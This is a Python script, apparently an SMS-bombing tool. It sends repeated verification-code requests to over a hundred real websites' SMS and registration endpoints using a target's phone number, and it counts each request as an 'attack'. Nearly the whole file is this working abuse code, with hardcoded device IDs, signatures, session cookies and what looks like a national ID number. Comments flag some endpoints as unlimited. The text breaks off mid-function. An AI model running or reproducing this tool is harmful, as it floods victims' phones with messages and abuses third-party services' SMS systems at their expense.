import urllib.request
import socket
import threading
import os

socket.setdefaulttimeout(3)
alltime = 0
oktime = 0
errortime = 0
myip = 'NULL'
def geturl(url):
    global alltime
    try:
        result = urllib.request.urlopen(url)
        alltime = alltime + 1
        print(' the ' + str(alltime) + ' attacks - ' + 'GET:' + str(result.status))
        return
    except:
        alltime = alltime + 1
        print(' the ' + str(alltime) + ' attacks - ' + 'GET:Error')
def posturl(url, data):
    global alltime
    data = data.encode('utf-8')
    sendurl = urllib.request.Request(url, data)
    try:
        result = urllib.request.urlopen(sendurl)
        alltime = alltime + 1
        print(' the ' + str(alltime) + ' attacks - ' + 'POST:' + str(result.status))
        return
    except:
        alltime = alltime + 1
        print(' the ' + str(alltime) + ' attacks - ' + 'POST:Error')
def dnsprefetch():
    global myip
    try:
        myip = urllib.request.urlopen('http://api.ip.la/').read()
        myip = myip.decode('utf-8')
    except:
        myip = 'Error'

    try:
        socket.gethostbyname('www.aipai.com')
    except:
        return
def gethz():
    posturl('https://api.motie.com/android/1/accounts/logincode', 'deviceId=863254010252178&mobile=' + mobile)
    geturl('https://news-api.prest3.com/api/users/sendMessageForRegLogin?phone=' + mobile)
    geturl('http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile=' + mobile)
    geturl(
        'http://zhuanxiaomiao.chucaotang.net/user/getCode.json?mobile=' + mobile + "&r_d=0.621285212181091&appSystem=android&deviceId=869071037469211")
    geturl('http://app.jiayouxueba.cn/api/v3/sms/getcode?mobile=' + mobile)
    geturl(
        'http://api.5v5.com/api/gold/eggs/mobileIsBind?mobile=' + mobile + "&ticket=52db140e1cdc4035e1c8921a597a870d")
    geturl('http://www.tansent.com/ajax_utf/?w=regscd&mb=' + mobile + "&rem=m&rty=p&_=1547618717516")
    geturl('http://www.hljfpz.com/Register/send.html?_t=0.6810571874332301&mobile=' + mobile)
    geturl(
        'http://a.qiantutu.cn/user/sendPhoneCode?dev_info=WZqUbyYEB7EALMJbrsxeGER%2B0TXh%2Bf0IUKq6yrflItSrRz2ZkSGg5ZROw%2FPQG%2B5BOakjHoQjwd%2Fu%0AyBzFEtAXxBY4E2Uw%2BIc8UR3aPYBBYPTAx%2Fk0VV%2Fq56lHDYLcwFs1O08A7QofvmB6808RVCG0V6x2%0AYwvPlXk%2BZWFEJ7SXeJciVCKxcgDJBigUHVRoVjNMbwNIk%2B40WmwunYv%2FrwYfwQ%3D%3D%0A&phoneNum=' + mobile)
    geturl("http://s.yunniao.cn/api/captcha/mobile_captcha?mobile=" + mobile + "&__t=1528719892298")
    geturl("http://news.focusdaily.cn/api/user/sendCode?phone=" + mobile + "&access_token=" + mobile + "&model=MI%206%20&os_ver=4.4.2&vendor=Xiaomi&device_type=android&imei=863254010252178&screen_width=900&mac=FC:AA:14:5A:53:F5&app_name=%E9%9F%AD%E8%8F%9C%E8%B5%84%E8%AE%AF&android_id=fcaa145a53f56649&ver_name=2.0.7&device_token=3f9521323c6dd73125355db9b3397377&language=zh&channel=tencent&app_ver=22&app_code=com.zujikandian.android&screen_height=1440")
def posthz():
    posturl('https://api.katoutiao.com/user/sms/send','sign=66eb0dce479b2cd42ee7e5a889220bc2&phone=' + mobile+'&type=1')
    posturl('https://api2.bearead.com/user/get_code?system=android&osv=4.4.2&version=4.1.4&device=863254010252178&nonce=1548148947&model=MI6&channel=baidu&sign=1471221e82300b9cec5325e8d9bf7469', 'international_code=%2B86&type=register&account=' + mobile)
    posturl('https://api.handtoutiao.com/user/send-code', 'timestamp=1548152183&sign=b0d2dfdcd2a5038b0958f09f35d45e42&unSign=timestamp%3D1548152183&phone=' + mobile)
    posturl("http://api.jubaokeji.cn/index/index.php?c=index&m=user&a=send_mobile_code", "mobile=" + mobile)
    posturl("http://hlbj.pospal.cn/m/accountv3/SendSecurityCodeCode?_=1527311755259",
            "CustomerTel=" + mobile + "&Source=&psplTime=4826150666050518%E4%B8%8A&psplToken=ANUYIm70qJ%2FeFXTpj8zm9dq06%2Flc%2BhdC97goJEeRTeC4OTPkhmRfG1v46ToNTEadIA%3D%3D&__RequestVerificationToken=")
    posturl("https://www.wandouip.com/api/sms/send", "phone=" + mobile)
    posturl("http://cszapi.iloveyujia.com/api/Uc/GetValidCode", "mobile=" + mobile)
    posturl(
        "http://napp.v1.cn/user/sendMsg?version=7.0.7&pcode=010110002&devid=3057e22d4c93ea8cff06933ac16546b6&plat=01011",
        "username=" + mobile)
    posturl("http://api.jubaokeji.cn/index/index.php?c=index&m=user&a=send_mobile_code", "mobile=" + mobile)
    posturl("http://dev.redapp.longu.xyz/data/user_api/ApiGetVerifyCode.php", "account=" + mobile + "&type=2")
    posturl("http://www.shiyushop.cn/Ajax.aspx", "tel=" + mobile + "&mode=sendmobile")
    posturl("https://app.justeasy.cn/user/code.php",
            "referer=android&phone=" + mobile + "&version=2.1.5&token=06cb8d2562c306856894195371a56078")
    posturl("http://www.rewenwen.com/mport.php", "phone=" + mobile + "&action=send_vertify_code&type=login_phone&")
    posturl("http://new.czxshop.com/wap/cash-send.html", "mobile=" + mobile)
    posturl("http://api.yingliangwangluo.com/taonews/login/getVerifyCodeNew.shtml",
            "signature=6030226f7bfb0503f67c54b62566f00e167c5d1e&os_version=8.0.0&mobile=" + mobile + "&imei=865220034235877&nonce=53569411&timestamp=1529578499")
    posturl("http://api.yingliangwangluo.com/taonews/login/getVerifyCodeNew.shtml",
            "signature=6030226f7bfb0503f67c54b62566f00e167c5d1e&os_version=8.0.0&mobile=" + mobile + "&imei=865220034235877&nonce=53569411&timestamp=1529578499")
    posturl("http://www.zhituhuwai.com/index.php/Home/Index/duanxin", "mobile" + mobile)
    posturl("http://www.icsoso.com/handle/HandlerPost_User.ashx",
            "action=SendCheckCode&mobile=" + mobile + "&email=&mode=register")
    posturl("http://ucenter.niuxcaipiao.com/index/getMobileCode", "mobile=" + mobile)
    geturl("http://www.huway.com/register/sms?phone=" + mobile + "&_=1524631112552")
    posturl(" http://www.rewenwen.com/mport.php", "phone=" + mobile + "&action=send_vertify_code&type=login_phone&")

    posturl("http://www.zhituhuwai.com/index.php/Home/Index/duanxin", "mobile=" + mobile)

    posturl("http://v.tzptchaxun.com/index.php/Home/Index/Getcode.html", "mobile=" + mobile + "&mobilecaptcha=&_t=")

    posturl("http://www.evervc.com/api/sms/request", "type=Register&phone=" + mobile)

    posturl("http://www.qcj18.com/doAjax.php?action=func_send_msg", "mobile=" + mobile)

    posturl("http://www.winsfish.com/index.php?ctl=user&act=verify", "mobile=" + mobile)

    geturl("http://yzgo168.com/user.php?act=is_registered&username=" + mobile + "&1523448423608")

    posturl("http://u.wei9y.com/athena-rest/rest?timestamp=20180407002849&method=sms.send.do&v=1.0",
            "username=" + mobile)

    posturl("http://ai.dearjie.com/RegisterAshx/GetPhoneVerCode.ashx", "phone=" + mobile)

    posturl("https://passport.xidibuy.com/reg/ajaxSendMobileCode",
            "mobile=" + mobile + "&_t_bD4xLzscbHOtLbz=ebee8863bbf370ae5fba0ff40f0dbc7e")

    posturl("https://ofly.olympus-imaging.cn/index.php?r=user/recovery/validateRegisterPhone", "phone=" + mobile)

    posturl("https://account.wps.cn/api/v4/signup",
            "cb=https%3A%2F%2Fvip.wps.cn%2F&from=vip&reload=true&account=" + mobile + "&password=z123321")

    posturl("http://www.gffitness.cn/Home/SendRegisterCode", "phone=" + mobile)

    posturl(
        "https://www.laprairie.com.cn/on/demandware.store/Sites-LaPrairie_CN_Transactional-Site/zh_CN/Account-MobileVerification",
        "phone=" + mobile + "&requestToken=695784&csrf_token=I6yWaWpt7XQrN1u2UuCpmlfTnU7yf94heKFOpYUcdx76-w0-vK6H6iRwcSdlLW7BB3Yd7dzi-R_b6ZptxKt0lqlhlqBI80ri6CVFxzWKA4jXJD62l_doG1EqvXfXg7NTStyKvTgSZm7SJ_cE1lmXPIYRmJO1Ksqp2zdUQ7SK6QadDfq5LUs")

    posturl("http://shop.adoodoo.com/enroll/ashx/ISExistLoginName.ashx", "tel=" + mobile)

    posturl("http://www.icsoso.com/handle/HandlerPost_User.ashx",
            "action=SendCheckCode&mobile=" + mobile + "&email=&mode=register")

    posturl("http://i.yingxiong.com/pass/SendPhoneCode",
            "CMGE_TOKEN=6ca2154782a22e152b5e42568012f8b592b1b2b7&phone=" + mobile)

    posturl("http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage", "mobile=" + mobile)

    posturl("http://member.tingyun.com/member/regist/checkLoginName", "loginName=" + mobile)

    posturl("http://www.yhdfa.com/index.php?s=/home/user/code_sms.html", "mobile=" + mobile + "&no_verify=1&type=1")

    posturl("http://www.dayin.la/site/code.html",
            "RegisterForm%5BhiddenCode%5D=32465786764&RegisterForm%5Bkey%5D=e596b29d80649be3f72d5ba2586cc6f2&RegisterForm%5Btime%5D=1524099906&RegisterForm%5Bmobile_prefix_id%5D=1&RegisterForm%5Bmobile%5D=" + mobile + "&RegisterForm%5Bpassword%5D=15888473378&RegisterForm%5Brealname%5D=15888473377&RegisterForm%5Bcode%5D=")

    posturl("http://www.dayin.la/site/code.html",
            "RegisterForm%5BhiddenCode%5D=32465786764&RegisterForm%5Bkey%5D=002ccc929f9e5bd45fc50db2dc772f44&RegisterForm%5Btime%5D=1524112565&RegisterForm%5Bmobile_prefix_id%5D=1&RegisterForm%5Bmobile%5D=" + mobile + "&RegisterForm%5Bpassword%5D=&RegisterForm%5Brealname%5D=&RegisterForm%5Bcode%5D=")

    posturl("http://www.yhdfa.com/index.php?s=/home/user/code_sms.html", "mobile=" + mobile + "&no_verify=1&type=1")

    posturl("https://login.zbj.com/register/ChkUn-type-5/", "sacc=" + mobile)

    posturl("http://www.8090wan.com/common/ajax_register_msg",
            "username=" + mobile + "&type=7&mtime=1524149020&mtimesi=fb0bb44223887874e1747510ea41cc10")

    posturl("http://api.yiqiyuedu.cn/api/student/sendVerifyCode",
            "urlHash=%2Fapi%2Fstudent%2FsendVerifyCode&phone=" + mobile + "&type=1")

    posturl("https://login.zbj.com/register/sendRegisterCode", "sacc=" + mobile + "&gt_type=register")

    posturl("http://www.surong360.com/SR360/application/user/sendSMS.do?0.563301095198766",
            "pccPhone=" + mobile + "&gt_type=register")

    posturl("http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode",
            "pccPhone=" + mobile + "&token=BLLB4E7RBJ6FTEZHBTPSTRFFBPIOKCZNBGRFBA7P5TXI&type=1")
    posturl("http://phone.gree.com/Account/SendSmsCode",
            "__RequestVerificationToken=h9fEYuMS3qTxFR0sdZpE0PJ85dZrATFRlOp22hge1CmtLXxDBJeL6OSJiEme4UKfgSdRz-yaXffmHH1jB0fkEmyDz3k1&phoneNumber=" + mobile + "&X-Requested-With=XMLHttpRequest")

    posturl("Http://api.lvwei8.com/api/Message/SendPhoneCode",
            "clientCommonInfo%5BareaCode%5D=410100&clientCommonInfo%5Bboard%5D=PLK-TL01H&clientCommonInfo%5Bbrand%5D=HONOR&clientCommonInfo%5BcurrentUserId%5D=5802897&clientCommonInfo%5BdeviceId%5D=867628027609429&clientCommonInfo%5BisOffical%5D=false&clientCommonInfo%5Blat%5D=34.819557&clientCommonInfo%5Blng%5D=113.690696&clientCommonInfo%5Bmodel%5D=PLK-TL01H&clientCommonInfo%5Bproduct%5D=PLK-TL01H&clientCommonInfo%5Bsdk%5D=6.0&clientCommonInfo%5BterminalSource%5D=2&clientCommonInfo%5BterminalSourceVersion%5D=1.2.91&param=" + mobile)

    posturl("http://www.admin333.com/QuicklyRegister.html", "mobile=" + mobile + "&submitButton=sendcode")
    posturl("http://www.928fk.com/index/login/send_register_sms", "phone=" + mobile)

    posturl("http://www.jinpaika.com/register/sms", "phone=" + mobile + "&t=1526717771956")
    posturl("http://www.mxj.com.cn/login/getVerifyCode", "mobile=" + mobile)

    posturl("http://care.seewo.com/easicare/account/dynamic/code", "userName=" + mobile + "&isLogin=false")
    geturl(
        "http://i.baihe.com/register/sendMobileCode?traceID=1&systemID=2&params=%7B%22appId%22%3A%221%22%2C%22channel%22%3A%22appstore%22%2C%22device%22%3A%22android%22%2C%22apver%22%3A%225.8.0%22%2C%22accessToken%22%3A%2212546879%22%2C%22IMEI%22%3A%22%22%2C%22mobile%22%3A%22" + mobile + "%22%2C%22type%22%3A1%7D")
    posturl("http://api.feelee.cc/api/login", "username=" + mobile)

    posturl("http://www.mmarri.com.cn/?mdname=user&action=mesvft&vungu_meimeng_mms=", "phone=" + mobile)
    posturl("http://jm-api.51jhle.com/api/smsNew", "phone=" + mobile)

    posturl("http://www.shxydai.com/Api/register_send_sms",
            "mobile=" + mobile + "&app_version=1.0.1&id=APP_REGISTER&pack_version=1.0")
    posturl("http://123.126.40.109:7001/newsleep/sendSMS/sendValidCode.shtml",
            "signature=e1b007c512085f3ff82a9d4f1b068c33&timestamp=1521627985334&token=&userTel=" + mobile)

    posturl("http://www.huazhen.com/new_api/userOperate/sendSmsMsg",
            "api_version=2.0&mobile=" + mobile + "&origin=2&sign=94699f7341b3815adb4b2bd238ccbdff&t=1521631953&version=2.1.2")

    posturl("http://www.rou01.com/mobcent/app/web/index.php?r=app/getcode",
            "act=register&mobile=" + mobile + "&egnVersion=v2100.5&sdkVersion=2.5.0.0&apphash=46cafb22&type=mobile&forumKey=Rjd0FTXHTJ6tgqbvdj")

    posturl("http://bxfish360.net:8081//service/index.php?controller=getcode", "mobile=" + mobile + "&type=1")

    posturl("http://www.qdh100.com//mobcent/app/web/index.php?r=app/getcode",
            "act=register&mobile=" + mobile + "&egnVersion=v2101.5&sdkVersion=2.5.0.0&apphash=46cafb22&type=mobile&forumKey=mhk3lJnqUPSBStQ8po")

    posturl(
        "http://super.xianjinxia.com/credit-user/reg-get-code?clientType=android&appVersion=2.3.2&deviceId=352462010184238&mobilePhone=&deviceName=SM-J700F&osVersion=4.4.2&appName=jsxjx&appMarket=xjx-yingyongbao",
        "phone=" + mobile + "&type=&captcha=0")

    posturl("http://api.yesauc.com/?do=login&act=mobilecode",
            "UUID=436C8E4B-80EB-4196-B83B-A3019E713808&mobile=" + mobile + "&ocKey=&registrationID=1114a897928a7349f7b&systemInfo%5BclientType%5D=iPhone&systemInfo%5BdeviceToken%5D=7e1ef58860f88feb020b0d8827f5ebc8a0148716199ba2ef9630ffaf1a9e10e1&systemInfo%5Bidentifier%5D=8CB32D97-9644-4915-A0AC-F1764E84D046&systemInfo%5Bmobile%5D=&systemInfo%5Bname%5D=iPhone%20%284%29&systemInfo%5BsystemName%5D=iOS&systemInfo%5BsystemVersion%5D=11.2.6&systemInfo%5Bversion%5D=1.5.0")

    posturl("http://www.idaycrm.com/sales/user/smsCode.do", "type=1&userphone=" + mobile)

    posturl("http://mobile.renrenchong.com.cn/Login/index",
            "act=getcode&oprateType=1&phone=" + mobile + "&sign=E476882795AC162949A393C4768A6585&timetamp=1521799188")

    posturl("http://api.daoyeapp.com/api/v1/send_verify_code", "tel=" + mobile)

    posturl("http://www.richjf.com/SVCode_ajaxLinkRandC_M", "phoneNo=" + mobile)

    posturl("http://www.dd369.com/dd369mobile/new/register_vip_new_mobile.jsp?action=checkSendMobile",
            "customerId=" + mobile + "&kind=2")

    posturl("http://www.jy12348.com/law/if/common/sms", "idcode=1&myphone=" + mobile + "&status=0")

    posturl("http://dudu.chongfa.cn/dudu/sms/register", "phone=" + mobile)

    posturl("http://newmobapi.intocity.cn/api/personalcenter/verificationCode", "mobile=" + mobile)

    posturl(
        "http://super.xianjinxia.com/credit-user/reg-get-code?clientType=android&appVersion=2.3.2&deviceId=352462010184238&mobilePhone=&deviceName=SM-J700F&osVersion=4.4.2&appName=jsxjx&appMarket=xjx-yingyongbao",
        "phone=" + mobile + "&type=&captcha=0")

    posturl("http://passport.weibo.cn/weixin/sendsms", "phone=" + mobile + "&entry=sinawap&state=&type=standard")

    posturl("http://api.dftoutiao.com/globaluc/sendmessage",
            "mobile_num=" + mobile + "&imei=864738037345667&idfa=caeba70f072c255a&qid=txyyb180223&softname=DFTTAndroid&softid=DFTT&softver=2.0.1&os=Android&os_version=Android7.1.1&device=vivo")

    posturl("http://m.scrcee.com/register/sendCode", "phone=" + mobile)

    posturl("http://m.changyoyo.com/register/sendcode.htm", "mobileid=" + mobile)

    posturl("http://user.mapi.jiashuangkuaizi.com/Passport/SendVoiceCode", "phone=" + mobile)

    posturl("http://api.fawuyou.cn/app/code02.php",
            "regcode=fb50d9fc04916dcabf2dd6129d62aa84&shebei=DC7248E6-A112-4CF4-9FE1-153972A7A0C5&mobile=" + mobile)

    posturl("http://api.fithub.cc/api/customer/sendCode", "mobile=" + mobile + "&type=phonelogin")

    posturl("http://27zbw.com/AccessAction", "phone=" + mobile)

    posturl("http://www.39xz.cn/rest/json/",
            "agent_id=144&api_key=fa6ea67bafae6709557430523e00802a&api_sig=2a715c47f3bc301099c6c0eb0edccad8&device_type=2&method=zhuan.auth.code&phone=" + mobile + "&timestamp=1519226283&token=2B4F4212-BB1F-466F-ACC5-BBBBE5447A25")

    posturl("http://api.yunyuer.com/user/auth_send/", "mobile=" + mobile + "&types=10")

    posturl("http://api.liqun888.com/verification-code/get", "mobile=" + mobile + "&type=1")

    posturl("http://app.luoboshuzhai.com/luoboserver/user/sendVerification",
            "clientId=1&deviceId=1524214712000&deviceType=iPhone9%2C2_iOS11.3&lang=0&loginUserId=-1&phoneNumber=" + mobile + "&sign=3C91BBE420C2118E1ED61EF69B5FB950&softVersion=1.9.14&timestamp=1524214763")

    posturl("http://119.23.216.192/GreenBasketApp/vercode/getCode", "mobile=" + mobile + "&vercode_type=USE_REGISTER")

    posturl("http://120.77.169.81/njl/rest/api/njl/sendSMS", "phone=" + mobile)

    posturl("http://wxapi.csair.com/cswx/wxbindform/getSMSValidateCode.wx",
            "wxid=oer35PqEtGNkiMwGE9euYCaJamaY&signature=&timestamp=&nonce=&cnFirstName=???&cnLastName=??3&certNo=513901199211175310&phoneNum=" + mobile)

    posturl("http://shidingtea.com/appa/login/sendverifycodec", "mobile=" + mobile)

    posturl("http://wx.gwjphone.com/api/factory/index/send-code",
            "phone=" + mobile + "&deviceID=EA292C5A-ED6A-4DBE-975C-8F28872345BD&iphoneShow=0")

    posturl("http://shop.kuaixiao365.com//Api/Phone/getNewCaptcha",
            "client_type=ios&platform_id=212&tel=" + mobile + "&type=register&version=1.05")

    posturl("http://api.52kanhaizi.com/index.php?act=send_code", "phone=" + mobile + "&type=reg")

    posturl("http://www.mingyizhijia.com/aglie-appsd/user/myhuser/GetVerificationCode",
            "key=A150CB313CA941867FFF0FBA45FB889D&mobile=" + mobile + "&time=1519483285000")

    posturl("http://47.95.48.240:8080/public4/getCaptcha.do",
            "key=45afdc2a954b42a553267b4595a51070&mobile=" + mobile + "&tx=heiwosiquanjia%2Cf1b81671737aaf06617f06b9cd2e5a54")

    geturl("http://www.huway.com/register/sms?phone=" + mobile + "&_=1524631112552")

    posturl("http://www.zhituhuwai.com/index.php/Home/Index/duanxin", "mobile=" + mobile)

    posturl("http://v.tzptchaxun.com/index.php/Home/Index/Getcode.html", "mobile=" + mobile + "&mobilecaptcha=&_t=")

    posturl("http://www.evervc.com/api/sms/request", "type=Register&phone=" + mobile)

    posturl("http://www.qcj18.com/doAjax.php?action=func_send_msg", "mobile=" + mobile)

    posturl("http://www.winsfish.com/index.php?ctl=user&act=verify", "mobile=" + mobile)

    geturl("http://yzgo168.com/user.php?act=is_registered&username=" + mobile + "&1523448423608")

    posturl("http://u.wei9y.com/athena-rest/rest?timestamp=20180407002849&method=sms.send.do&v=1.0",
            "username=" + mobile)

    posturl("http://ai.dearjie.com/RegisterAshx/GetPhoneVerCode.ashx", "phone=" + mobile)

    posturl(
        "http://user.700store.com/ajax/dynamic?OP=SendValCode&Phone=" + mobile,
        "Qi_SessionId=cgtnwndwuryg3bw3yuccz1s4; Hm_lvt_d20e98403bc12f91ffe70c2930549bb9=1523458753; Hm_lpvt_d20e98403bc12f91ffe70c2930549bb9=1523458753; UM_distinctid=162b537c38a457-0aa1bf016dc981-49473b1c-144000-162b537c38b8a6; CNZZDATA1255775147=1032456675-1523453723-http%253A%252F%252Fwww.700store.com%252F%7C1523453723; Hm_lvt_0bd5902d44e80b78cb1cd01ca0e85f4a=1523458756,1523458764,1523458848; Hm_lpvt_0bd5902d44e80b78cb1cd01ca0e85f4a=1523458848", )

    posturl("https://passport.xidibuy.com/reg/ajaxSendMobileCode",
            "mobile=" + mobile + "&_t_bD4xLzscbHOtLbz=ebee8863bbf370ae5fba0ff40f0dbc7e")

    posturl("https://ofly.olympus-imaging.cn/index.php?r=user/recovery/validateRegisterPhone", "phone=" + mobile)

    posturl("https://account.wps.cn/api/v4/signup",
            "cb=https%3A%2F%2Fvip.wps.cn%2F&from=vip&reload=true&account=" + mobile + "&password=z123321")

    posturl("http://www.gffitness.cn/Home/SendRegisterCode", "phone=" + mobile)

    posturl(
        "https://www.laprairie.com.cn/on/demandware.store/Sites-LaPrairie_CN_Transactional-Site/zh_CN/Account-MobileVerification",
        "phone=" + mobile + "&requestToken=695784&csrf_token=I6yWaWpt7XQrN1u2UuCpmlfTnU7yf94heKFOpYUcdx76-w0-vK6H6iRwcSdlLW7BB3Yd7dzi-R_b6ZptxKt0lqlhlqBI80ri6CVFxzWKA4jXJD62l_doG1EqvXfXg7NTStyKvTgSZm7SJ_cE1lmXPIYRmJO1Ksqp2zdUQ7SK6QadDfq5LUs")

    posturl("http://shop.adoodoo.com/enroll/ashx/ISExistLoginName.ashx", "tel=" + mobile)

    posturl("http://www.icsoso.com/handle/HandlerPost_User.ashx",
            "action=SendCheckCode&mobile=" + mobile + "&email=&mode=register")

    posturl("http://i.yingxiong.com/pass/SendPhoneCode",
            "CMGE_TOKEN=6ca2154782a22e152b5e42568012f8b592b1b2b7&phone=" + mobile)

    posturl("http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage", "mobile=" + mobile)

    posturl("http://member.tingyun.com/member/regist/checkLoginName", "loginName=" + mobile)

    posturl("http://www.yhdfa.com/index.php?s=/home/user/code_sms.html", "mobile=" + mobile + "&no_verify=1&type=1")

    posturl("http://www.dayin.la/site/code.html",
            "RegisterForm%5BhiddenCode%5D=32465786764&RegisterForm%5Bkey%5D=e596b29d80649be3f72d5ba2586cc6f2&RegisterForm%5Btime%5D=1524099906&RegisterForm%5Bmobile_prefix_id%5D=1&RegisterForm%5Bmobile%5D=" + mobile + "&RegisterForm%5Bpassword%5D=15888473378&RegisterForm%5Brealname%5D=15888473377&RegisterForm%5Bcode%5D=")

    posturl("http://www.dayin.la/site/code.html",
            "RegisterForm%5BhiddenCode%5D=32465786764&RegisterForm%5Bkey%5D=002ccc929f9e5bd45fc50db2dc772f44&RegisterForm%5Btime%5D=1524112565&RegisterForm%5Bmobile_prefix_id%5D=1&RegisterForm%5Bmobile%5D=" + mobile + "&RegisterForm%5Bpassword%5D=&RegisterForm%5Brealname%5D=&RegisterForm%5Bcode%5D=")

    posturl("http://www.yhdfa.com/index.php?s=/home/user/code_sms.html", "mobile=" + mobile + "&no_verify=1&type=1")

    posturl("https://login.zbj.com/register/ChkUn-type-5/", "sacc=" + mobile)

    posturl("http://www.8090wan.com/common/ajax_register_msg",
            "username=" + mobile + "&type=7&mtime=1524149020&mtimesi=fb0bb44223887874e1747510ea41cc10")

    posturl("http://api.yiqiyuedu.cn/api/student/sendVerifyCode",
            "urlHash=%2Fapi%2Fstudent%2FsendVerifyCode&phone=" + mobile + "&type=1")

    posturl("https://login.zbj.com/register/sendRegisterCode", "sacc=" + mobile + "&gt_type=register")

    posturl("http://www.surong360.com/SR360/application/user/sendSMS.do?0.563301095198766",
            "pccPhone=" + mobile + "&gt_type=register")

    posturl("http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode",
            "pccPhone=" + mobile + "&token=BLLB4E7RBJ6FTEZHBTPSTRFFBPIOKCZNBGRFBA7P5TXI&type=1")

    posturl("http://phone.gree.com/Account/SendSmsCode",
            "__RequestVerificationToken=h9fEYuMS3qTxFR0sdZpE0PJ85dZrATFRlOp22hge1CmtLXxDBJeL6OSJiEme4UKfgSdRz-yaXffmHH1jB0fkEmyDz3k1&phoneNumber=" + mobile + "&X-Requested-With=XMLHttpRequest")

    posturl("Http://api.lvwei8.com/api/Message/SendPhoneCode",
            "clientCommonInfo%5BareaCode%5D=410100&clientCommonInfo%5Bboard%5D=PLK-TL01H&clientCommonInfo%5Bbrand%5D=HONOR&clientCommonInfo%5BcurrentUserId%5D=5802897&clientCommonInfo%5BdeviceId%5D=867628027609429&clientCommonInfo%5BisOffical%5D=false&clientCommonInfo%5Blat%5D=34.819557&clientCommonInfo%5Blng%5D=113.690696&clientCommonInfo%5Bmodel%5D=PLK-TL01H&clientCommonInfo%5Bproduct%5D=PLK-TL01H&clientCommonInfo%5Bsdk%5D=6.0&clientCommonInfo%5BterminalSource%5D=2&clientCommonInfo%5BterminalSourceVersion%5D=1.2.91&param=" + mobile)

    geturl("http://www.lfs79.com/Huiyuan/vipMsgHandler.ashx?vipPhone=" + mobile + "&ct=0")

    geturl(
        "http://www.wudiquan.com/web/sendMobileCode?userName=" + mobile + "&pageToken=sk%252BRCuo%252BIuEf56VGEx15lF%252FWUHHCQN1WZdVwSdLw5TeVARVxvQzPMmyUb6GM3p93")

    geturl(
        "http://www.weiba.cn/ajax?module=ajax&action=refreshhiddenSpan&isUserLogined=false&moduleBeforeAjax=user&currentLink=http%3A%2F%2Fshop.weiba.cn%2Fregister.html&ajaxAction=getMobileCode&pageIndex=&pageCount=&bigTypeID=&smallTypeID=&tinyTypeID=&brandID=&sortTypeID=&keyword=&props=&productID=&key=&keyword2=&appTypeID=&keywordInput=FansPhone%E5%BE%A1&firstKeyword=FansPhone%E5%BE%A1&mobile=??" + mobile + "&mobileCode=&mobilePassword=&mobilePassword2=&mobileAgreement=1&email=&emailPassword=&emailPassword2=&randomString=&emailAgreement=on&registerTypeID=2")

    geturl("http://www.zhaicuoben.com/user/GetSmsAction.a?phone=" + mobile + "&vendor=1")

    geturl("http://www.hoo365.com/index.php?m=sms&act=registeryz&mobile=" + mobile)

    geturl("http://www.paiche365.com/index.php/Public/send_phone_code?phone=" + mobile + "&type=reg")

    geturl(
        "http://www.rklmobi.com/reg_message.sv?mobile=" + mobile + "&passTemp=%E6%88%91%E6%9C%80%E5%96%9C%E6%AC%A2%E4%BD%A0%E4%BA%86%EF%BC%81%EF%BC%81%E4%B9%88%E4%B9%88%E5%93%92")

    geturl(
        "http://sunland.org.cn/tuiguang/tuiguang_message_close.htm?tel=" + mobile + "&url=&projectName=&schoolName=&remark=&messageType=&name=undefined")
    geturl("http://www.dzb.cn/assignee/users/check_user?uni_code=pc&cell=" + mobile)

    geturl("http://www.ddaiwang.com/tools/submit_ajax.ashx?action=user_register_smscode?mobile=" + mobile)

    geturl("http://www.longone.com.cn/servlet/user/Register?&function=AjaxGetPin&mo=" + mobile)

    geturl("https://webtrade.95579.com/servlet/user/Business?function=CheckReged&username=" + mobile)

    geturl("http://www.95579.com/servlet/user/Business?function=CheckReged&username=" + mobile)

    geturl("http://www.shwlzy.com/account/api_send_log_msg/?mobile=" + mobile + "&user_type=2")
def wuxian():
    posturl('https://api.motie.com/android/1/accounts/logincode', 'deviceId=863254010252178&mobile=' + mobile)
    geturl('https://news-api.prest3.com/api/users/sendMessageForRegLogin?phone=' + mobile)
    # GET接口：PPTV
    geturl(
        'http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=' + mobile)
    # GET接口：爱拍
    geturl('http://www.aipai.com/app/www/apps/ums.php?step=ums&mobile=' + mobile)
    # GET接口：场多多
    geturl('https://www.admin.cddm2c.com/cdd_admin/platform/cdd/supplierApply/sendVerifyCode?&tel=' + mobile)
    # GET接口：一站购
    geturl('http://yzgo168.com/user.php?act=is_registered&username=' + mobile + '&1523448423608')
    # POST接口：智途户外
    posturl('http://www.zhituhuwai.com/index.php/Home/Index/duanxin', 'mobile=' + mobile)
    # POST接口：贵金属
    posturl('http://v.tzptchaxun.com/index.php/Home/Index/Getcode.html', 'mobile=' + mobile + '&mobilecaptcha=&_t=')
    # POST接口：天天投
    posturl('http://www.evervc.com/api/sms/request', 'type=Register&phone=' + mobile)
    # POST接口：盈鱼金服
    posturl('http://www.winsfish.com/index.php?ctl=user&act=verify', 'mobile=' + mobile)
    # POST接口：微九娱
    posturl('http://u.wei9y.com/athena-rest/rest?timestamp=20180407002849&method=sms.send.do&v=1.0',
            'username=' + mobile)
    # POST接口：喜地
    posturl('https://passport.xidibuy.com/reg/ajaxSendMobileCode',
            'mobile=' + mobile + '&_t_bD4xLzscbHOtLbz=ebee8863bbf370ae5fba0ff40f0dbc7e')
    # POST接口：奥粉乐园
    posturl('https://ofly.olympus-imaging.cn/index.php?r=user/recovery/validateRegisterPhone', 'phone=' + mobile)
    # POST接口：WPS
    posturl('https://account.wps.cn/api/v4/signup',
            'cb=https%3A%2F%2Fvip.wps.cn%2F&from=vip&reload=true&account=' + mobile + '&password=z123321')
    # POST接口：跑步机
    posturl('http://www.gffitness.cn/Home/SendRegisterCode', 'phone=' + mobile)
    # POST接口：爱多多
    posturl('http://shop.adoodoo.com/enroll/ashx/ISExistLoginName.ashx', 'tel=' + mobile)
    # POST接口：ics电子元件
    posturl('http://www.icsoso.com/handle/HandlerPost_User.ashx',
            'action=SendCheckCode&mobile=' + mobile + '&email=&mode=register')
    # POST接口：恰合达（无限）
    posturl('http://www.yhdfa.com/index.php?s=/home/user/code_sms.html', 'mobile=' + mobile + '&no_verify=1&type=1')
    # GET接口：中煤招标（无限）
    geturl('http://www.zmzb.com/ebidding/UserAction.do?no_sitemesh&method=queryCode&phone=' + mobile)
    # GET接口：中华户外网（无限）
